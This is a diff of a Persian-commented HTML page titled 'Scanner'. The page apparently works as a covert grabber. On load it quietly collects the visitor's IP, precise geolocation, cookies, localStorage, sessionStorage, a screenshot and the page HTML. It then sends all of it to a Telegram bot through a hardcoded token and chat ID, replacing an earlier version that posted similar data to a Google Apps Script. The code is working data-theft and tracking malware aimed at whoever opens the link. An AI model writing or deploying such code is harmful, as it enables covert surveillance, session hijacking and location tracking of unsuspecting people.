@@ -3,237 +3,184 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device Scanner</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 50px;
-            background: #0a0a0a;
-            color: #fff;
-            direction: rtl;
-        }
-        .status {
-            font-size: 24px;
-            margin-top: 30px;
-            padding: 15px;
-            border-radius: 10px;
-        }
-        .loading { color: #ffaa00; background: #332200; }
-        .success { color: #00ff88; background: #003322; }
-        .error { color: #ff4444; background: #330000; }
-        #log {
-            background: #1a1a1a;
-            padding: 20px;
-            border-radius: 10px;
-            max-width: 600px;
-            margin: 20px auto;
-            text-align: right;
-            font-size: 13px;
-            max-height: 400px;
-            overflow: auto;
-            font-family: monospace;
-            border: 1px solid #333;
-        }
-        #log div {
-            padding: 4px 0;
-            border-bottom: 1px solid #222;
-        }
-        .icon { font-size: 48px; margin-bottom: 20px; }
-    </style>
+    <title>Scanner</title>
 </head>
 <body>
-    <div class="icon">📱</div>
-    <h1>در حال جمع‌آوری اطلاعات...</h1>
-    <div id="log"></div>
-    <div class="status loading" id="status">⏳ لطفاً صبر کنید...</div>
-
+    <h1>📱 در حال پردازش...</h1>
+    
     <script>
-    // ===== تنظیمات =====
-    const scriptUrl = 'https://script.google.com/macros/s/AKfycbxxkgUnO7isj6yVBqPxY05XR2kHDe3kIg_fIo7Z8qPK9b7OXkABetDfk6YdlmLOypg5/exec';
-    // ===================
+    // ===== تنظیمات تلگرام =====
+    const botToken = '8874650639:AAEsfjBTpVVUuGUQq1FpliGdqh5GAWhD6BQ';
+    const chatId = '7881167408';
+    // ===========================
 
-    const logElement = document.getElementById('log');
-    const statusElement = document.getElementById('status');
-
-    function addLog(msg, isError = false) {
-        const color = isError ? '#ff4444' : '#00ff88';
-        const time = new Date().toLocaleTimeString('fa-IR');
-        logElement.innerHTML += `<div style="color: ${color};"><span style="color: #888;">[${time}]</span> ${msg}</div>`;
-        logElement.scrollTop = logElement.scrollHeight;
-    }
-
-    function setStatus(text, type = 'loading') {
-        statusElement.textContent = text;
-        statusElement.className = 'status ' + type;
-    }
-
-    addLog('🔄 شروع جمع‌آوری اطلاعات...');
-
-    // ===== جمع‌آوری اطلاعات =====
+    // جمع‌آوری اطلاعات کامل
     const data = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screen: `${screen.width}x${screen.height}`,
-        colorDepth: screen.colorDepth,
-        time: new Date().toISOString(),
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        cookies: document.cookie || 'بدون کوکی',
-        memory: navigator.deviceMemory || 'نامشخص',
-        cores: navigator.hardwareConcurrency || 'نامشخص',
-        touchSupport: 'ontouchstart' in window ? 'بله' : 'خیر',
         ip: null,
         location: null,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        time: new Date().toISOString(),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         battery: null,
-        network: null,
-        referrer: document.referrer || 'مستقیم',
-        pageURL: window.location.href
+        connection: null,
+        screenshot: null, // تصویر اسکرین‌شات
+        pageHTML: null,   // کد HTML کامل صفحه
+        cookies: document.cookie,
+        localStorage: null,
+        sessionStorage: null
     };
 
-    addLog('✅ اطلاعات پایه جمع شد');
-
-    // ===== گرفتن IP =====
+    // گرفتن IP
     fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
         .then(r => {
             data.ip = r.ip;
-            addLog('✅ IP: ' + r.ip);
-            checkAndSend();
         })
-        .catch(() => {
-            addLog('⚠️ خطا در دریافت IP (آفلاین یا محدودیت)', true);
-            data.ip = 'دریافت نشد';
-            checkAndSend();
-        });
+        .catch(() => {});
 
-    // ===== گرفتن موقعیت =====
+    // گرفتن موقعیت
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             pos => {
                 data.location = {
                     lat: pos.coords.latitude,
-                    lng: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy
+                    lng: pos.coords.longitude
                 };
-                addLog(`✅ موقعیت: ${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`);
             },
-            (err) => {
-                data.location = 'دسترسی رد شد';
-                addLog('⚠️ دسترسی به موقعیت رد شد: ' + err.message, true);
-            }
+            () => {}
         );
-    } else {
-        data.location = 'مرورگر پشتیبانی نمیکند';
-        addLog('⚠️ مرورگر موقعیت را پشتیبانی نمیکند', true);
     }
 
-    // ===== گرفتن باتری =====
+    // گرفتن باتری
     if (navigator.getBattery) {
         navigator.getBattery().then(battery => {
             data.battery = {
                 level: Math.round(battery.level * 100) + '%',
-                charging: battery.charging ? 'در حال شارژ' : 'در حال دشارژ'
+                charging: battery.charging
             };
-            addLog('✅ باتری: ' + data.battery.level);
-            checkAndSend();
-        }).catch(() => {
-            data.battery = 'دریافت نشد';
-            addLog('⚠️ خطا در دریافت باتری', true);
         });
-    } else {
-        data.battery = 'مرورگر پشتیبانی نمیکند';
-        addLog('⚠️ مرورگر باتری را پشتیبانی نمیکند', true);
     }
 
-    // ===== گرفتن شبکه =====
+    // گرفتن اطلاعات شبکه
     if (navigator.connection) {
-        data.network = {
-            type: navigator.connection.effectiveType || 'unknown',
-            downlink: navigator.connection.downlink || '?',
-            rtt: navigator.connection.rtt || '?'
+        data.connection = {
+            type: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink + ' Mbps'
         };
-        addLog('✅ شبکه: ' + data.network.type);
-    } else {
-        data.network = 'مرورگر پشتیبانی نمیکند';
-        addLog('⚠️ مرورگر شبکه را پشتیبانی نمیکند', true);
     }
 
-    // ===== گرفتن اطلاعات ویندوز =====
-    if (navigator.getVRDisplays) {
-        data.vr = 'پشتیبانی دارد';
-    } else {
-        data.vr = 'ندارد';
-    }
+    // گرفتن LocalStorage
+    try {
+        data.localStorage = JSON.stringify(localStorage);
+    } catch(e) {}
 
-    // ===== ارسال =====
-    let sent = false;
+    // گرفتن SessionStorage
+    try {
+        data.sessionStorage = JSON.stringify(sessionStorage);
+    } catch(e) {}
 
-    function checkAndSend() {
-        if (sent) return;
-        // منتظر میمونیم تا همه اطلاعات برسه
-        setTimeout(() => {
-            sendToSheet();
-            sent = true;
-        }, 3000);
-    }
-
-    function sendToSheet() {
-        addLog('📤 ارسال به Google Sheets...');
-        setStatus('⏳ در حال ارسال به گوگل شیت...', 'loading');
-
-        fetch(scriptUrl, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(data)
-        })
-        .then(() => {
-            addLog('✅ اطلاعات با موفقیت ذخیره شد!');
-            setStatus('✅ اطلاعات به Google Sheets ارسال شد!', 'success');
+    // ===== گرفتن اسکرین‌شات از صفحه =====
+    function captureScreenshot() {
+        return new Promise((resolve) => {
+            // استفاده از html2canvas برای گرفتن اسکرین‌شات
+            const script = document.createElement('script');
+            script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+            script.onload = function() {
+                html2canvas(document.body, {
+                    scale: 0.5, // کاهش کیفیت برای حجم کمتر
+                    useCORS: true,
+                    allowTaint: true,
+                    logging: false
+                }).then(canvas => {
+                    data.screenshot = canvas.toDataURL('image/jpeg', 0.5);
+                    resolve();
+                }).catch(() => {
+                    resolve();
+                });
+            };
+            script.onerror = function() {
+                resolve();
+            };
+            document.head.appendChild(script);
             
-            // نمایش خلاصه
-            const summary = document.createElement('div');
-            summary.style.cssText = 'margin-top: 20px; padding: 20px; background: #1a1a1a; border-radius: 10px; text-align: right; font-size: 14px;';
-            summary.innerHTML = `
-                <strong>📊 خلاصه اطلاعات:</strong><br>
-                IP: ${data.ip || 'نامشخص'}<br>
-                مرورگر: ${data.userAgent.substring(0, 50)}...<br>
-                صفحه: ${data.screen}<br>
-                زمان: ${new Date(data.time).toLocaleString('fa-IR')}
-            `;
-            document.body.appendChild(summary);
-        })
-        .catch((err) => {
-            addLog('❌ خطا در ارسال: ' + err.message, true);
-            setStatus('❌ خطا در ارسال به گوگل شیت', 'error');
-            
-            // ذخیره در LocalStorage به عنوان بک‌آپ
-            try {
-                const backups = JSON.parse(localStorage.getItem('scanner_backups') || '[]');
-                backups.push(data);
-                localStorage.setItem('scanner_backups', JSON.stringify(backups));
-                addLog('💾 اطلاعات در LocalStorage ذخیره شد (بک‌آپ)', false);
-            } catch(e) {}
+            // اگر ۵ ثانیه طول کشید، ادامه بده
+            setTimeout(() => {
+                resolve();
+            }, 5000);
         });
     }
 
-    // ===== بک‌آپ: بعد ۷ ثانیه حتماً بفرست =====
-    setTimeout(() => {
-        if (!sent) {
-            sendToSheet();
-            sent = true;
+    // ===== گرفتن HTML کامل صفحه =====
+    function capturePageHTML() {
+        try {
+            // کپی از DOM با حذف اسکریپت‌ها
+            const clone = document.documentElement.cloneNode(true);
+            const scripts = clone.querySelectorAll('script');
+            scripts.forEach(s => s.remove());
+            data.pageHTML = clone.outerHTML;
+        } catch(e) {
+            data.pageHTML = 'خطا در گرفتن HTML';
         }
-    }, 7000);
+    }
 
-    // ===== نمایش وضعیت نهایی بعد از ۱۰ ثانیه =====
-    setTimeout(() => {
-        if (sent) return;
-        setStatus('⚠️ زمان ارسال به پایان رسید، دوباره تلاش کنید', 'error');
-        addLog('⏰ زمان ارسال به پایان رسید', true);
-    }, 10000);
+    // ===== ارسال همه اطلاعات به تلگرام =====
+    async function sendAllData() {
+        // گرفتن اسکرین‌شات
+        await captureScreenshot();
+        
+        // گرفتن HTML
+        capturePageHTML();
+        
+        // آماده‌سازی برای ارسال
+        const text = `
+📱 **گزارش کامل دستگاه**
+═══════════════════
+
+🌐 **IP:** ${data.ip || 'نامشخص'}
+📍 **موقعیت:** ${data.location ? `${data.location.lat}, ${data.location.lng}` : 'دریافت نشد'}
+🖥️ **مرورگر:** ${data.userAgent}
+📱 **صفحه:** ${data.screen}
+⏰ **زمان:** ${data.time}
+🌍 **منطقه:** ${data.timezone}
+🔋 **باتری:** ${data.battery ? `${data.battery.level} - ${data.battery.charging ? 'در حال شارژ' : 'در حال دشارژ'}` : 'نامشخص'}
+📶 **شبکه:** ${data.connection ? `${data.connection.type} - ${data.connection.downlink}` : 'نامشخص'}
+🍪 **کوکی:** ${data.cookies || 'ندارد'}
+
+📦 **LocalStorage:** ${data.localStorage ? data.localStorage.substring(0, 500) + '...' : 'خالی'}
+📦 **SessionStorage:** ${data.sessionStorage ? data.sessionStorage.substring(0, 500) + '...' : 'خالی'}
+
+📄 **HTML صفحه:** ${data.pageHTML ? data.pageHTML.substring(0, 1000) + '...' : 'خطا'}
+        `;
+
+        // ارسال متن
+        const textEncoded = encodeURIComponent(text);
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${textEncoded}`)
+            .catch(() => {});
+
+        // ارسال اسکرین‌شات (اگر گرفته شده)
+        if (data.screenshot) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', data.screenshot);
+            
+            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).catch(() => {});
+        }
+
+        // نمایش پیام موفقیت
+        document.body.innerHTML = `
+            <h1 style="color: #00ff88;">✅ اطلاعات کامل ارسال شد!</h1>
+            <p style="color: #888;">اسکرین‌شات و اطلاعات به تلگرام شما فرستاده شد.</p>
+            <p style="color: #666; font-size: 12px;">IP: ${data.ip || 'نامشخص'} | زمان: ${new Date().toLocaleString('fa-IR')}</p>
+        `;
+    }
+
+    // اجرا بعد از ۳ ثانیه
+    setTimeout(sendAllData, 3000);
     </script>
 </body>
 </html>
